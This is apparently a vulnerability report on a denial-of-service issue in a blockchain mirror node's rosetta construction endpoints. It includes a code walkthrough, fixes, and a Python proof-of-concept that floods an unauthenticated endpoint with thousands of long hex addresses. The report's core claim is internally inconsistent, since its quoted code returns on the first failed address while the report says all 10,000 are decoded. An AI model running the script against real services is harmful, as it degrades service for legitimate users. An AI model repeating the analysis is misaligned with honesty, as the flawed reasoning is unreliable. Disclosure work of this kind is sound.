### Title
Unbounded Operation Count and Address Length in `getOperationSlice()` Enables CPU Exhaustion via Unauthenticated Requests

### Summary
The `getOperationSlice()` function in `rosetta/app/services/construction_service.go` iterates over all caller-supplied operations and invokes `types.NewAccountIdFromString()` on each `Account.Address` with no limit on the number of operations or the length of each address string. No rate limiting, operation count cap, or request body size enforcement exists anywhere in the rosetta service layer. An unauthenticated attacker can POST a crafted `ConstructionPreprocessRequest` or `ConstructionPayloadsRequest` containing thousands of operations with arbitrarily long `0x`-prefixed address strings, forcing repeated hex decoding and protobuf/cryptographic key unmarshaling that exhausts server CPU.

### Finding Description

**Exact code path:**

`ConstructionPreprocess` (line 289) and `ConstructionPayloads` (line 232) both call `getOperationSlice(request.Operations)`.

Inside `getOperationSlice()` (lines 432–465):
```go
for _, operation := range operations {
    if operation.Account != nil {
        accountId, err = types.NewAccountIdFromString(
            operation.Account.Address, c.systemShard, c.systemRealm)
        ...
    }
}
``` [1](#0-0) 

There is no check on `len(operations)` before the loop, and no check on `len(operation.Account.Address)` before the call.

`NewAccountIdFromString()` (lines 182–201) branches on the address format:
- If the address contains `"."`: calls `domain.EntityIdFromString()` — cheap integer parsing.
- If the address starts with `"0x"`: calls `hex.DecodeString()` (O(n) allocation) then `NewAccountIdFromAlias()` → `NewPublicKeyFromAlias()`, which performs protobuf unmarshaling and cryptographic key type detection on the decoded byte slice. [2](#0-1) 

**Root cause / failed assumption:** The code assumes callers supply a reasonable number of operations with short, well-formed addresses. No defensive bound is enforced at any layer — no `maxOperations` constant, no address length cap, no HTTP body size middleware, and no rate limiter were found anywhere in the rosetta Go source. [3](#0-2) 

**Why existing checks are insufficient:** The only check after parsing is `accountId.IsZero()` (line 442), which is a post-parse guard. It does not prevent the expensive work from occurring first. The error return on line 443 exits the loop early for a *single* bad operation, but an attacker supplies many operations each with a long but syntactically valid `0x`-prefixed hex string, so each one runs the full hex decode + protobuf unmarshal path before failing. [4](#0-3) 

### Impact Explanation
An attacker can degrade or crash the rosetta service for all legitimate users by monopolizing CPU with repeated hex decoding and protobuf unmarshaling. Because both `/construction/preprocess` and `/construction/payloads` are unauthenticated public endpoints, the attack requires no credentials or on-chain assets. The impact is a denial-of-service / griefing of the mirror node's rosetta API with no economic cost to the attacker.

### Likelihood Explanation
Any external user who can reach the rosetta HTTP port can exploit this. The attack is trivially scriptable: a single HTTP client sending a loop of large POST requests is sufficient. It is repeatable and requires no special knowledge beyond the public Rosetta API specification. The absence of rate limiting or body-size enforcement makes sustained attack straightforward.

### Recommendation
1. **Cap operation count**: Add a `maxOperations` constant (e.g., 100) and reject requests where `len(operations) > maxOperations` before entering the loop in `getOperationSlice()`.
2. **Cap address string length**: Add a `maxAddressLength` constant (e.g., 256 bytes) and reject any `operation.Account.Address` exceeding it before calling `NewAccountIdFromString()`.
3. **Enforce HTTP body size limit**: Configure a `http.MaxBytesReader` on the rosetta HTTP server to cap total request body size (e.g., 1 MB).
4. **Add rate limiting**: Apply per-IP or global rate limiting middleware to all construction endpoints.

### Proof of Concept
```python
import requests, json

# Craft a request with 10,000 operations, each with a 10 KB hex address
long_addr = "0x" + "ab" * 5000  # 10 KB hex string per operation
operations = [
    {
        "operation_identifier": {"index": i},
        "type": "CRYPTO_TRANSFER",
        "account": {"address": long_addr},
        "amount": {"value": "100", "currency": {"symbol": "HBAR", "decimals": 8}}
    }
    for i in range(10000)
]

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "operations": operations
}

# Send to /construction/preprocess (unauthenticated)
r = requests.post(
    "http://<rosetta-host>:5700/construction/preprocess",
    json=payload,
    timeout=60
)
# Server CPU spikes as it hex-decodes and protobuf-unmarshals each address
print(r.status_code, r.elapsed)
```
Each request forces the server to call `hex.DecodeString()` + `NewPublicKeyFromAlias()` 10,000 times on 5,000-byte byte slices. Sending this in a tight loop from multiple clients exhausts available CPU cores.

```go
func (c *constructionAPIService) getOperationSlice(operations []*rTypes.Operation) (
	types.OperationSlice,
	*rTypes.Error,
) {
	operationSlice := make(types.OperationSlice, 0, len(operations))
	for _, operation := range operations {
		var accountId types.AccountId
		if operation.Account != nil {
			var err error
			accountId, err = types.NewAccountIdFromString(operation.Account.Address, c.systemShard, c.systemRealm)
			if err != nil || accountId.IsZero() {
				return nil, errors.ErrInvalidAccount
			}
		}

		var amount types.Amount
		var rErr *rTypes.Error
		if operation.Amount != nil {
			if amount, rErr = types.NewAmount(operation.Amount); rErr != nil {
				return nil, rErr
			}
		}

		operationSlice = append(operationSlice, types.Operation{
			AccountId: accountId,
			Amount:    amount,
			Index:     operation.OperationIdentifier.Index,
			Metadata:  operation.Metadata,
			Type:      operation.Type,
		})
	}

	return operationSlice, nil
}

```go
func NewAccountIdFromString(address string, shard, realm int64) (zero AccountId, _ error) {
	if strings.Contains(address, ".") {
		entityId, err := domain.EntityIdFromString(address)
		if err != nil {
			return zero, err
		}
		return AccountId{accountId: entityId}, nil
	}

	if !strings.HasPrefix(address, tools.HexPrefix) {
		return zero, errors.Errorf("Invalid Account Alias")
	}

	alias, err := hex.DecodeString(tools.SafeRemoveHexPrefix(address))
	if err != nil {
		return zero, err
	}

	return NewAccountIdFromAlias(alias, shard, realm)
}
